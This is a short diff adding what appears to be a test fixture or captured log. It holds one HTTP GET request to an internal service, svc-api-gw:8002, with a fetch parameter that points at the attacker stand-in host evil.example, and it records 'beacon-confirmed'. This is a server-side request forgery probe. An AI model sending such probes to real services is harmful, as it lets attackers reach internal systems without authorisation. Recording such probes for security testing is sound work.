@@ -1,0 +1,7 @@
+request:
+GET /fetch?url=http://evil.example
+Host: svc-api-gw:8002
+User-Agent: tanyin/1
+Connection: close
+
+observed: beacon-confirmed synthetic response
